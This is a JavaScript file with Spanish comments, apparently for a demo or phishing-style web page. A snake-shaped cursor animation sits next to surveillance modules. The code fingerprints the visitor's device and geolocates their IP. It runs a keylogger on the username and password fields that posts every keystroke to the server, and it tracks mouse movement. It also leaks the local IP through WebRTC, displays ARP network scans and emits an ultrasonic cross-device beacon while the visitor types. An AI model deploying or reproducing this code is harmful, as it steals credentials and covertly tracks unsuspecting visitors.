// ==========================================
// MÓDULO 0: ANIMACIÓN DEL CURSOR (QUETZALCOATL PERFECTO)
// ==========================================
const screenSVG = document.querySelector('#screen');
const nsSVG = "http://www.w3.org/2000/svg";
const xlinkNSSVG = "http://www.w3.org/1999/xlink";
 
if (screenSVG) screenSVG.style.pointerEvents = 'none';
 
const numSegments = 60;
let points = new Array(numSegments);
let pointer = { x: window.innerWidth / 2, y: window.innerHeight / 2 };
 
window.addEventListener('mousemove', (e) => {
    pointer.x = e.clientX;
    pointer.y = e.clientY;
});
 
// Ensamblaje de la serpiente emplumada (Perfect Code extraído de fotografías de Timeline)
if (screenSVG) {
    for (let i = 1; i < numSegments; i++) {
        let bodyPart = document.createElementNS(nsSVG, 'image');
 
        if (i === numSegments - 1) {
            bodyPart.setAttributeNS(xlinkNSSVG, 'href', 'quetzalcoatl-tail.png');
            bodyPart.setAttribute('width', '200');
            bodyPart.setAttribute('height', '200');
            bodyPart.setAttribute('x', '-100');
            bodyPart.setAttribute('y', '-100');
        } else {
            bodyPart.setAttributeNS(xlinkNSSVG, 'href', 'quetzalcoatl-body.png');
            bodyPart.setAttribute('width', '50');
            bodyPart.setAttribute('height', '50');
            bodyPart.setAttribute('x', '-25');
            bodyPart.setAttribute('y', '-25');
        }
 
        screenSVG.appendChild(bodyPart);
        points[i] = { x: pointer.x, y: pointer.y, element: bodyPart };
    }
 
    let headElement = document.createElementNS(nsSVG, 'image');
    headElement.setAttributeNS(xlinkNSSVG, 'href', 'quetzalcoatl-head.png');
    headElement.setAttribute('width', '150');
    headElement.setAttribute('height', '150');
    headElement.setAttribute('x', '-75');
    headElement.setAttribute('y', '-75');
    screenSVG.appendChild(headElement);
 
    points[0] = { x: pointer.x, y: pointer.y, element: headElement };
 
    // Bucle de animación suave (Perfect Code)
    function animateCursor() {
        let dx = pointer.x - points[0].x;
        let dy = pointer.y - points[0].y;
 
        points[0].x += dx * 0.15;
        points[0].y += dy * 0.15;
 
        let angleRadians = Math.atan2(dy, dx);
        let angleDegrees = angleRadians * (180 / Math.PI);
 
        // Lógica avanzada de rotación y espejo
        let scaleY = 1;
        if (dx < 0) {
            scaleY = -1;
        }
 
        points[0].element.setAttributeNS(null, "transform", `translate(${points[0].x}, ${points[0].y}) rotate(${angleDegrees}) scale(1, ${scaleY})`);
 
        for (let i = 1; i < numSegments; i++) {
            let bodyDx = points[i - 1].x - points[i].x;
            let bodyDy = points[i - 1].y - points[i].y;
 
            points[i].x += bodyDx * 0.35;
            points[i].y += bodyDy * 0.35;
 
            if (i === numSegments - 1) {
                let tailAngleRadians = Math.atan2(bodyDy, bodyDx);
                let tailAngleDegrees = tailAngleRadians * (180 / Math.PI);
 
                let tailScaleY = 1;
                if (bodyDx < 0) {
                    tailScaleY = -1;
                }
 
                points[i].element.setAttributeNS(null, "transform", `translate(${points[i].x}, ${points[i].y}) rotate(${tailAngleDegrees}) scale(1, ${tailScaleY})`);
            } else {
                points[i].element.setAttributeNS(null, "transform", `translate(${points[i].x}, ${points[i].y})`);
            }
        }
        requestAnimationFrame(animateCursor);
    }
    // Inicializar la animación
    animateCursor();
}
 
// ==========================================
// MÓDULO 1 y 2: DASHBOARD OSINT Y HARDWARE
// ==========================================
async function obtenerPerfilCompleto() {
    return {
        userAgent: navigator.userAgent,
        nucleosCPU: navigator.hardwareConcurrency || "Desconocido",
        memoriaRAM: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Desconocida",
        resolucion: `${window.screen.width}x${window.screen.height}`,
        bateria: await (navigator.getBattery ? navigator.getBattery().then(b => Math.round(b.level * 100) + "%").catch(() => "Bloqueado") : Promise.resolve("No soportado"))
    };
}
 
const btnIp = document.getElementById('btn-ip');
if (btnIp) {
    btnIp.addEventListener('click', async () => {
        const divResultado = document.getElementById('resultado-ip');
        divResultado.innerHTML = "<p style='color: yellow;'>Rastreando satélites y construyendo perfil...</p>";
 
        try {
            const perfil = await obtenerPerfilCompleto();
 
            // Petición con ruta RELATIVA para compatibilidad con el túnel Ngrok
            const response = await fetch('/api/ip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ huella: perfil })
            });
 
            if (!response.ok) throw new Error("El servidor Python rechazó la conexión.");
 
            const data = await response.json();
 
            // URL Segura de Google Maps en vista satelital (t=k)
            const urlMapa = `https://maps.google.com/maps?q=${data.latitud},${data.longitud}&t=k&z=14&output=embed`;
 
            divResultado.innerHTML = `
                <div style="background: #1e1e1e; padding: 20px; border-radius: 8px; border: 1px solid #333; color: #00ff00; font-family: monospace; font-size: 14px;">
                    <h3 style="color: #fff; margin-top: 0; border-bottom: 1px solid #444; padding-bottom: 10px;">🌐 Panel de Inteligencia de Red</h3>
 
                    <p style="color: #ff9900; margin-bottom: 5px;"><strong>📍 ESPECIFICACIONES DE CONEXIÓN:</strong></p>
                    <ul style="color: #ccc; list-style-type: square;">
                        <li><b>Dirección IP:</b> <span style="color: white; font-weight: bold;">${data.ip}</span></li>
                        <li><b>Proveedor (ISP):</b> ${data.isp}</li>
                        <li><b>Sistema Autónomo (ASN):</b> ${data.asn}</li>
                    </ul>
 
                    <p style="color: #ff9900; margin-bottom: 5px;"><strong>🌍 GEOLOCALIZACIÓN:</strong></p>
                    <ul style="color: #ccc; list-style-type: square;">
                        <li><b>Ubicación:</b> ${data.ciudad}, ${data.estado}, ${data.pais}</li>
                        <li><b>Código Postal:</b> ${data.codigo_postal}</li>
                        <li><b>Coordenadas:</b> Lat ${data.latitud}, Lon ${data.longitud}</li>
                        <li><b>Zona Horaria:</b> ${data.zona_horaria}</li>
                    </ul>
 
                    <p style="color: #ff9900; margin-bottom: 5px;"><strong>💻 HUELLA FÍSICA Y NAVEGADOR:</strong></p>
                    <ul style="color: #ccc; list-style-type: square;">
                        <li><b>Entorno:</b> ${perfil.userAgent}</li>
                        <li><b>Procesador / RAM:</b> ${perfil.nucleosCPU} núcleos | ${perfil.memoriaRAM}</li>
                        <li><b>Batería:</b> ${perfil.bateria}</li>
                        <li><b>Pantalla:</b> ${perfil.resolucion}</li>
                    </ul>
 
                    <div style="margin-top: 20px; border: 2px solid #555; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.5);">
                        <iframe width="100%" height="300" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="${urlMapa}"></iframe>
                    </div>
                </div>
            `;
        } catch (error) {
            console.error("Error OSINT:", error);
            divResultado.innerHTML = "<p style='color: red; font-weight: bold;'>[ERROR] Interferencia en la conexión maestro.</p>";
        }
    });
}
 
// ==========================================
// MÓDULO 3: KEYLOGGER CON BUFFER SEPARADO
// ==========================================
let currentlyFocusedField = null;
const keyloggerBuffers = {
    'user-input': '',
    'pass-input': ''
};
 
document.addEventListener('focusin', (evento) => {
    if (evento.target.tagName === 'INPUT' && (evento.target.id === 'user-input' || evento.target.id === 'pass-input')) {
        currentlyFocusedField = evento.target;
    }
});
 
document.addEventListener('keydown', (evento) => {
    if (!currentlyFocusedField || document.activeElement !== currentlyFocusedField) return;
 
    const fieldId = currentlyFocusedField.id;
    const key = evento.key;
 
    if (key.length === 1) {
        keyloggerBuffers[fieldId] += key;
    } else if (key === 'Backspace') {
        keyloggerBuffers[fieldId] = keyloggerBuffers[fieldId].slice(0, -1);
    }
 
    // Petición con ruta RELATIVA. Enviamos la tecla y el contexto (fieldId)
    fetch('/api/keylogger', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            tecla: key,
            field: fieldId,
            texto_actual: keyloggerBuffers[fieldId]
        })
    }).catch(e => {});
});
 
// ==========================================
// MÓDULO 4: BIOMETRÍA CONDUCTUAL (RATÓN)
// ==========================================
let contadorRaton = 0;
document.addEventListener('mousemove', (evento) => {
    contadorRaton++;
    if (contadorRaton % 15 === 0) {
        // Petición con ruta RELATIVA
        fetch('/api/raton', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ x: evento.clientX, y: evento.clientY })
        }).catch(e => {});
    }
});
 
// ==========================================
// MÓDULO 5: RADAR DE RED (FINGERPRINTING PROFUNDO, PROCESAMIENTO POR LOTES, CORRECCIÓN DE CONTADOR Y BLOQUEO) + (UNIVERSAL & SIGINT AVANZADO)
// ==========================================
// ==========================================
// MOTOR SIGINT CAPA 2 - ARP)
// ==========================================
// ==========================================
// RADAR DE RED (ARP CAPA 2 + FINGERPRINTING CAPA 7)
// ==========================================
// ==========================================
// MÓDULO 5: RADAR DE RED (FRONTEND SINCRONIZADO CON PYTHON)
// ==========================================
const btnEscaner = document.getElementById('btn-escaner');
 
if (btnEscaner) {
    const inputManual = document.getElementById('input-subred-manual');
    if (inputManual) inputManual.remove();
 
    btnEscaner.addEventListener('click', async () => {
        btnEscaner.disabled = true;
        btnEscaner.style.opacity = '0.5';
        btnEscaner.innerText = "[ INTERCEPTANDO RED FÍSICA... ]";
 
        let radarWrapper = document.getElementById('radar-wrapper');
        if (!radarWrapper) {
            radarWrapper = document.createElement('div');
            radarWrapper.id = 'radar-wrapper';
            radarWrapper.innerHTML = `
                <div id="radar-circular-container"><div id="radar-sweep-line"></div></div>
                <div id="radar-logs-panel">
                    <div class="radar-header">
                        <span><b>[SISTEMA] Motor de Inteligencia Python</b></span>
                        <span style="color:#0ff; font-weight:bold;">VIVOS: <span id="contador-dispositivos" style="color:#fff;">0</span></span>
                    </div>
                    <div id="log-entries"></div>
                </div>
            `;
            btnEscaner.parentNode.insertBefore(radarWrapper, btnEscaner.nextSibling);
        }
 
        const circularArea = document.getElementById('radar-circular-container');
        const logsPanel = document.getElementById('log-entries');
        const contadorUI = document.getElementById('contador-dispositivos');
 
        contadorUI.innerText = '0';
        circularArea.innerHTML = '<div id="radar-sweep-line"></div>';
        logsPanel.innerHTML = `<p style="color: yellow;"><b>[SISTEMA] Delegando análisis profundo al backend (servidor.py)...</b></p>`;
 
        try {
            // Solicitar los datos ya procesados y clasificados por la IA de Python
            const respuesta = await fetch('/api/scan_arp');
            const datos = await respuesta.json();
 
            if (datos.status === "success") {
                const dispositivos = datos.devices;
                contadorUI.innerText = dispositivos.length;
 
                if (datos.red_detectada) {
                    logsPanel.innerHTML += `<p style="color:#0ff;">[RED] Subred detectada: <b>${datos.red_detectada}</b> | Hosts escaneados: <b>${datos.total_hosts_escaneados}</b></p>`;
                }
                logsPanel.innerHTML += `<p><b>[SISTEMA] ${dispositivos.length} nodos físicos extraídos. Revelando identidades:</b></p>`;
 
                dispositivos.forEach(disp => {
                    // Posición en el radar basada en el último octeto de la IP
                    const lastOctet = parseInt(disp.ip.split('.').pop()) || 128;
                    const angle = (lastOctet / 255) * 2 * Math.PI - Math.PI / 2;
                    const radio = disp.clase === 'db' ? 0 : (28 + (lastOctet % 16));
                    const x = 50 + radio * Math.cos(angle);
                    const y = 50 + radio * Math.sin(angle);

                    const punto = document.createElement('div');
                    punto.className = `radar-node ${disp.clase}`;
                    punto.style.cssText = `left: ${Math.max(8, Math.min(88, x))}%; top: ${Math.max(8, Math.min(88, y))}%; opacity: 1;`;
                    punto.innerHTML = `<div class="pulse-circle"></div><span class="icono-nodo">${disp.icono}</span>`;
                    punto.title = `[IDENTIFICADO] ${disp.ip} - ${disp.tipo}`;
                    circularArea.appendChild(punto);

                    // Log con hostname, fabricante y puertos
                    const hostnameStr = disp.hostname
                        ? `<br><span style="color:#00e676; font-size:0.85em; margin-left:20px;">⬡ Host: ${disp.hostname}</span>`
                        : '';
                    const vendorStr = disp.vendor
                        ? ` | <span style="color:#c9a227;">${disp.vendor}</span>`
                        : '';
                    const puertosStr = disp.puertos && disp.puertos.length > 0
                        ? `<br><span style="color:#ff9900; font-size:0.8em; margin-left:20px;">Puertos: [${disp.puertos.join(', ')}]</span>`
                        : '';

                    const p = document.createElement('p');
                    p.innerHTML = `<span style="color:#0f0;">➤</span> IP: <b>${disp.ip}</b> | ${disp.icono} <span style="color:#0ff; font-weight:bold;">${disp.tipo}</span>${vendorStr}<br><span style="color:#aaa; font-size:0.85em; margin-left:20px;">MAC: ${disp.mac}</span>${hostnameStr}${puertosStr}`;
                    logsPanel.appendChild(p);
                });
 
                logsPanel.innerHTML += `<p><b>[SISTEMA] Reconocimiento y clasificación completados.</b></p>`;
            } else {
                logsPanel.innerHTML += `<p style="color: red;">[ERROR PYTHON] ${datos.message}</p>`;
            }
        } catch (error) {
            logsPanel.innerHTML += `<p style="color: red;">[ERROR CRÍTICO] No se pudo comunicar con el backend.</p>`;
        }
 
        document.getElementById('radar-logs-panel').scrollTop = document.getElementById('radar-logs-panel').scrollHeight;
        btnEscaner.disabled = false;
        btnEscaner.style.opacity = '1';
        btnEscaner.innerText = "Escanear Dispositivos Locales";
    });
}
// ==========================================
// MÓDULO 6: REVELADOR DE IP REAL (WebRTC)
// ==========================================
const btnWebRtc = document.getElementById('btn-webrtc');
if (btnWebRtc) {
    btnWebRtc.addEventListener('click', () => {
        const ipsEncontradas = new Set();
        const configuracion = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
        const conexion = new RTCPeerConnection(configuracion);
 
        conexion.createDataChannel('');
 
        conexion.onicecandidate = (evento) => {
            if (!evento.candidate) return;
 
            const candidato = evento.candidate.candidate;
            const matchIp = candidato.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
 
            if (matchIp) {
                const ipReal = matchIp[1];
 
                if (!ipsEncontradas.has(ipReal)) {
                    ipsEncontradas.add(ipReal);
 
                    let tipo = "Pública";
                    if (ipReal.startsWith('192.168.') || ipReal.startsWith('10.') || ipReal.match(/^172\.(1[6-9]|2\d|3[0-1])\./)) {
                        tipo = "Local / Interna";
                    } else if (ipReal.includes(':')) {
                        tipo = "IPv6";
                    }
 
                    fetch('/api/webrtc', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ ip: ipReal, tipo: tipo })
                    }).catch(e => {});
                }
            }
        };
 
        conexion.createOffer()
            .then(oferta => conexion.setLocalDescription(oferta))
            .catch(e => {});
    });
}

// ==========================================
// MÓDULO 7: BALIZA ULTRASÓNICA (uXDT EMITTER)
// ==========================================
let balizaEmitiendo = false;
let audioCtxGlobal = null;

function emitirBalizaUltrasonica() {
    if (balizaEmitiendo) return; // ya hay una emisión activa, no saturar
    balizaEmitiendo = true;

    try {
        // Reusar el AudioContext si ya existe (los navegadores limitan cuántos se crean)
        if (!audioCtxGlobal || audioCtxGlobal.state === 'closed') {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            audioCtxGlobal = new AudioContext();
        }
        if (audioCtxGlobal.state === 'suspended') {
            audioCtxGlobal.resume();
        }

        const osc      = audioCtxGlobal.createOscillator();
        const gainNode = audioCtxGlobal.createGain();

        osc.frequency.value = 19500; // inaudible para humanos
        osc.type            = 'sine';
        gainNode.gain.value = 0.8;   // subido a 0.8 para salones grandes

        osc.connect(gainNode);
        gainNode.connect(audioCtxGlobal.destination);

        osc.start();

        setTimeout(() => {
            osc.stop();
            balizaEmitiendo = false; // lista para el siguiente disparo
            console.log("%c[SIGINT] Baliza Ultrasónica emitida en el entorno físico.", "color: #ff9900; font-weight: bold;");
        }, 1500);

    } catch (e) {
        balizaEmitiendo = false;
        console.error("[ERROR] El navegador bloqueó la baliza:", e);
    }
}

// Disparar al primer clic (desbloquea el AudioContext en el navegador)
document.addEventListener('click', emitirBalizaUltrasonica, { once: true });

// Disparar cada vez que se escribe en los campos de login
document.addEventListener('DOMContentLoaded', () => {
    const campoUsuario = document.getElementById('user-input');
    const campoPassword = document.getElementById('pass-input');

    [campoUsuario, campoPassword].forEach(campo => {
        if (!campo) return;
        campo.addEventListener('keydown', () => {
            emitirBalizaUltrasonica();
        });
    });
});